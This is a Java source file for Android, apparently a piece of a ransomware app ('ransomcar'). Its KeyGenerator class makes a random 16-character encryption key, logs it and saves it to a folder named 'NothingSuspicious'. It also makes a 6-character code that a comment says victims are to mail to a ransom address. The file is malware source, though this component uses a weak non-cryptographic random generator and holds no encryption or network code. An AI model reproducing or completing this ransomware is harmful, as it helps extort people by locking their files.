package com.example.ransomcar;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Random;
import android.os.Environment;
import android.util.Log;

public class KeyGenerator {

	//main function - return encryption key
	public static String key(){
			String key = genEncKey();
			Log.d("nameValuePairs  ", key);		      
		return key;
	}

	// Generate the encryption key
	private static String genEncKey(){
		
		String IV = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"; // Initialization vector
		int len = 16; // Length of the key
		Random rnd = new Random(); // Random value
		StringBuilder sb = new StringBuilder(len);
		
		for( int i = 0; i < len; i++ ) sb.append(IV.charAt(rnd.nextInt(IV.length()))); // Generate the random key
		String key = sb.toString(); // final key
		Log.d("Key after generation  ", key);
		
		// Save key to file
  		BufferedWriter bw;
		try {
			File dir = new File(Environment.getExternalStorageDirectory(), "NothingSuspicious");
			if(!dir.exists()){dir.mkdirs();}
			File myKey = new File(dir, "JustMyKey.txt");
			if(!myKey.exists()){myKey.createNewFile();}
			bw = new BufferedWriter(new FileWriter(myKey));
			bw.write(key);
			bw.close();
		
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return key;
	} 
	
	public static String token() {
		// Generate secret string to mail at payransom@proton.com
		String IV = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"; // Initialization vector
		int len = 6; // Length of the code
		Random rndSecret = new Random(); // Random value
		StringBuilder sbSecret = new StringBuilder(len);
		
		for( int i = 0; i < len; i++ ) sbSecret.append(IV.charAt(rndSecret.nextInt(IV.length()))); // Generate the secret code
		String secretCode = sbSecret.toString(); // final code
		Log.d("SecretCode after generation  ", secretCode);

		return secretCode;
	}
}
